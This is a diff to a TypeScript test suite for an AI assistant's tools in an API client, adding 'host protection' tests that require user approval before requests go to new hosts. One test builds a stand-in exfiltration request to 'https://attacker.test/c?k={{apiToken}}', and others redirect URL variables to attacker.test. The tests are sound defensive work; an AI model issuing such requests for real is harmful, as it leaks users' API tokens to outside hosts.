@@ -14,7 +14,14 @@ import { loadSchemaFromSdl } from '../../shared/graphqlSchemaLoader';
 const SECRET = 'sup3r-s3cret-value';
 
 function makeHost(
-  overrides: { autoApplyEdits?: boolean; confirmBeforeRun?: boolean; approve?: boolean; shareEnvironmentValues?: boolean } = {},
+  overrides: {
+    autoApplyEdits?: boolean;
+    confirmBeforeRun?: boolean;
+    approve?: boolean;
+    shareEnvironmentValues?: boolean;
+    /** Origin the active request resolves to; null when it cannot be resolved. */
+    origin?: string | null;
+  } = {},
 ) {
   const inCollection = createDefaultHttpRequest({
     id: 'req_in_col',
@@ -76,8 +83,10 @@ function makeHost(
       addRequest: calls.addRequest,
       openRequest: calls.openRequest,
       sendActiveRequest: calls.sendActiveRequest,
+      resolveRequestOrigin: () => (overrides.origin === undefined ? 'http://localhost' : overrides.origin),
     },
     requestApproval: calls.requestApproval,
+    approvedSendOrigins: new Set<string>(),
     getApprovalPolicy: async () => ({
       autoApplyEdits: overrides.autoApplyEdits ?? false,
       confirmBeforeRun: overrides.confirmBeforeRun ?? true,
@@ -411,6 +420,125 @@ describe('redirect protection', () => {
   });
 });
 
+describe('host protection (security review)', () => {
+  it('create_request asks when the new request uses a host the collection does not', async () => {
+    const { host, calls } = makeHost({ autoApplyEdits: true });
+    await executeAiTool(call('create_request', { request: { name: 'Ok', url: '{{baseUrl}}/new' } }), host);
+    expect(calls.requestApproval).not.toHaveBeenCalled();
+    expect(calls.addRequest).toHaveBeenCalledTimes(1);
+
+    const r = await executeAiTool(
+      call('create_request', { request: { name: 'Exfil', url: 'https://attacker.test/c?k={{apiToken}}' } }),
+      host,
+    );
+    expect(r.ok).toBe(true);
+    expect(calls.requestApproval).toHaveBeenCalledTimes(1);
+    expect(calls.requestApproval.mock.calls[0][0].warning).toContain('host no other request');
+  });
+
+  it('does not create a request to a new host when the user declines', async () => {
+    const { host, calls } = makeHost({ autoApplyEdits: true, approve: false });
+    await executeAiTool(call('create_request', { request: { url: 'https://attacker.test/' } }), host);
+    expect(calls.addRequest).not.toHaveBeenCalled();
+  });
+
+  it('asks before adding a capture that writes into a host variable', async () => {
+    const capture = { variable: 'baseUrl', scope: 'environment', source: 'jsonpath', expression: '$.website' };
+    const { host, calls } = makeHost({ autoApplyEdits: true });
+    await executeAiTool(
+      call('update_request', { changes: { captures: [{ ...capture, variable: 'orderId' }] } }),
+      host,
+    );
+    expect(calls.requestApproval).not.toHaveBeenCalled();
+
+    await executeAiTool(call('update_request', { changes: { captures: [capture] } }), host);
+    expect(calls.requestApproval).toHaveBeenCalledTimes(1);
+    expect(calls.requestApproval.mock.calls[0][0].warning).toContain('baseUrl');
+
+    await executeAiTool(
+      call('create_request', { request: { url: '{{baseUrl}}/x', captures: [capture] } }),
+      host,
+    );
+    expect(calls.requestApproval).toHaveBeenCalledTimes(2);
+    expect(calls.requestApproval.mock.calls[1][0].warning).toContain('Captures response values into baseUrl');
+  });
+
+  it('asks before switching off or shadowing a URL variable', async () => {
+    const { host, calls } = makeHost({ autoApplyEdits: true });
+    await executeAiTool(call('set_environment_variables', { variables: [{ key: 'baseUrl', enabled: false }] }), host);
+    expect(calls.requestApproval).toHaveBeenCalledTimes(1);
+
+    await executeAiTool(
+      call('set_environment_variables', {
+        environment: 'collection',
+        variables: [{ key: 'baseUrl', value: 'https:attacker.test' }],
+      }),
+      host,
+    );
+    expect(calls.requestApproval).toHaveBeenCalledTimes(2);
+    expect(calls.requestApproval.mock.calls[1][0].warning).toContain('baseUrl');
+  });
+
+  it('asks before changing a bare host variable used in request URLs', async () => {
+    const { host, state, calls } = makeHost({ autoApplyEdits: true });
+    const { collection } = state.collections[0];
+    state.collections[0] = {
+      ...state.collections[0],
+      collection: {
+        ...collection,
+        items: [...collection.items, createDefaultHttpRequest({ url: 'https://{{apiHost}}/v1' })],
+        variables: [{ key: 'apiHost', value: 'api.good.test', enabled: true }],
+      },
+    };
+    await executeAiTool(
+      call('set_environment_variables', { environment: 'collection', variables: [{ key: 'apiHost', value: 'attacker.test' }] }),
+      host,
+    );
+    expect(calls.requestApproval).toHaveBeenCalledTimes(1);
+    expect(calls.requestApproval.mock.calls[0][0].warning).toContain('apiHost');
+  });
+
+  it('send_request shows the resolved host and asks the first time per host, even without send confirmation', async () => {
+    const { host, calls } = makeHost({ confirmBeforeRun: false, origin: 'https://api.good.test' });
+    calls.sendActiveRequest.mockResolvedValue(response());
+    await executeAiTool(call('send_request'), host);
+    expect(calls.requestApproval).toHaveBeenCalledTimes(1);
+    const first = calls.requestApproval.mock.calls[0][0];
+    expect(first.title).toBe('Send GET {{baseUrl}}/users → https://api.good.test');
+    expect(first.warning).toContain('First request from the assistant to https://api.good.test');
+
+    await executeAiTool(call('send_request'), host);
+    expect(calls.requestApproval).toHaveBeenCalledTimes(1);
+    expect(calls.sendActiveRequest).toHaveBeenCalledTimes(2);
+
+    host.workspace.resolveRequestOrigin = () => 'https://attacker.test';
+    await executeAiTool(call('send_request'), host);
+    expect(calls.requestApproval).toHaveBeenCalledTimes(2);
+    expect(calls.requestApproval.mock.calls[1][0].warning).toContain('https://attacker.test');
+  });
+
+  it('send_request does not remember a declined host and always asks for unresolvable hosts', async () => {
+    const declined = makeHost({ confirmBeforeRun: false, approve: false, origin: 'https://attacker.test' });
+    await executeAiTool(call('send_request'), declined.host);
+    expect(declined.host.approvedSendOrigins!.size).toBe(0);
+    expect(declined.calls.sendActiveRequest).not.toHaveBeenCalled();
+
+    const unknown = makeHost({ confirmBeforeRun: false, origin: null });
+    unknown.calls.sendActiveRequest.mockResolvedValue(response());
+    await executeAiTool(call('send_request'), unknown.host);
+    await executeAiTool(call('send_request'), unknown.host);
+    expect(unknown.calls.requestApproval).toHaveBeenCalledTimes(2);
+    expect(unknown.calls.requestApproval.mock.calls[0][0].warning).toContain('could not be worked out');
+
+    const noMemory = makeHost({ confirmBeforeRun: false });
+    delete noMemory.host.approvedSendOrigins;
+    noMemory.calls.sendActiveRequest.mockResolvedValue(response());
+    await executeAiTool(call('send_request'), noMemory.host);
+    await executeAiTool(call('send_request'), noMemory.host);
+    expect(noMemory.calls.requestApproval).toHaveBeenCalledTimes(2);
+  });
+});
+
 describe('send_request', () => {
   it('requires approval by default and returns a sanitized response', async () => {
     const { host, calls } = makeHost();
@@ -428,6 +556,7 @@ describe('send_request', () => {
     expect(declined.calls.sendActiveRequest).not.toHaveBeenCalled();
 
     const auto = makeHost({ confirmBeforeRun: false });
+    auto.host.approvedSendOrigins!.add('http://localhost');
     auto.calls.sendActiveRequest.mockResolvedValue(response());
     await executeAiTool(call('send_request'), auto.host);
     expect(auto.calls.requestApproval).not.toHaveBeenCalled();
@@ -443,6 +572,7 @@ describe('send_request', () => {
 
   it('fails cleanly with no active tab or no response', async () => {
     const { host, state, calls } = makeHost({ confirmBeforeRun: false });
+    host.approvedSendOrigins!.add('http://localhost');
     calls.sendActiveRequest.mockResolvedValue(null);
     expect(await executeAiTool(call('send_request'), host)).toMatchObject({ ok: false });
     state.activeTabId = null;
